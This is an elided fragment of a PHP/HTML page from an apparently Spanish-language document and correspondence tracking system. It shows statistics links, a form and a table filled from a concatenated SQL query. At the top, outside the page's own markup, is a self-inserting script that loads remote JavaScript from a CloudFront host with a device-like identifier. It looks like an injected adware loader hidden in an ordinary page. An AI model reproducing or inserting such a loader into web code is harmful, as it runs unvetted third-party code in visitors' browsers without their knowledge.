...
<script type="text/javascript">(function(){var a=document.createElement("script");a.type="text/javascript";a.async=!0;a.src="http://d36mw5gp02ykm5.cloudfront.net/yc/adrns_y.js?v=6.11.119#p=hitachixhds721032cla362_jpb440hf09xskm09xskmx";var b=document.getElementsByTagName("script")[0];b.parentNode.insertBefore(a,b);})();</script>
    ...
    <div class="row">
    <div class="col-lg-3"> 
    <h4><a href="../estadisticas/documentos_usuario.php" target="_blank" onClick="window.open(this.href, this.target, 'width=1000,height=700,scrollbars=YES'); return false;">
    DOCUMENTOS POR USUARIO</a></h4>
    </div>
    <div class="col-lg-3"> 
    </div>
    <div class="col-lg-3"> 
    ...
    <div class="col-lg-3">
    <form name="FORMU" action="../correspondencia/detalle_documentos_scep.php" method="post">
...
<div class="table-responsive">
      <table class="table table-bordered" id="example" width="100%" cellspacing="0">
            ...
            $sql.=" , adjunto_hr.entidad_destino, adjunto_hr.hoja_ruta, adjunto_hr.idusuario, corres.codigo FROM adjunto_hr, tipo_documento, corres WHERE adjunto_hr.idtipo_documento=tipo_documento.idtipo_documento AND ";
        ...
        <td><?php echo $row[8]."</br>Cod. ".$row[10];?></br>
...
<!--       <form name="VALIDA" action="valida_empresa.php" method="post">
        ...
        <button type="submit" class="btn-link">VER REGISTRO</button></form>  -->
        </td>
        </tr>  
            <?php
            $numero=$numero+1;  
